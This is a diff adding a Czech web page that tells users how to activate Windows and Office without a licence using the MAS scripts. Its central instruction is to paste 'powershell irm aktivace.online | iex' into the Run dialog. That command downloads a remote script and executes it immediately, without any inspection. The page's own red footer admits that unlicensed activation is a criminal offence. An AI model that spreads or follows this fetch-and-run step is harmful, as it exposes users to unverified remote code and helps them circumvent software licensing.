@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>aktivace.online</title>
+	<link rel="shortcut icon" href="favicon.ico?">
+	<style>
+	@import url(https://fonts.googleapis.com/css?family=Open+Sans);
+	* {
+		margin: 0;
+		padding: 0;
+		font-family: Open Sans, sans-serif;
+		font-size: 25px;
+		color: #222;
+		background: #ebebeb;
+		cursor: default;
+		line-height: 1.7;
+	}
+	input {
+		border: none;
+		width: 450px;
+		font-weight: bold;
+		text-align: center;
+	}
+	a, input {
+		cursor: pointer;
+	}
+	#x {
+		color: #900000;
+	}
+	</style>
+</head>
+<body>
+	<center>
+		<br>
+		<p>Aktivace Windows a Office pomocí <a href="https://massgrave.dev/">MAS</a></p>
+		<br>
+		<p>Zkopírujte si následující řádek:</p>
+		<input onclick="select(this)" readonly value="powershell irm aktivace.online | iex">
+		<p>Stiskněte <b>Windows + R</b>, řádek vložte a potvrďte.</p>
+		<p>Na klávesnici zvolte: <b>1</b> pro Windows | <b>2</b>, poté <b>1</b> pro Office.</p>
+		<br>
+		<p>Nemáte Office nainstalovaný? <b><a href="https://aktivace.online/office">aktivace.online/office</a></b></p>
+		<p id="x">Aktivace bez patřičné licence je trestná.</p>
+	</center>
+</body>
+</html>
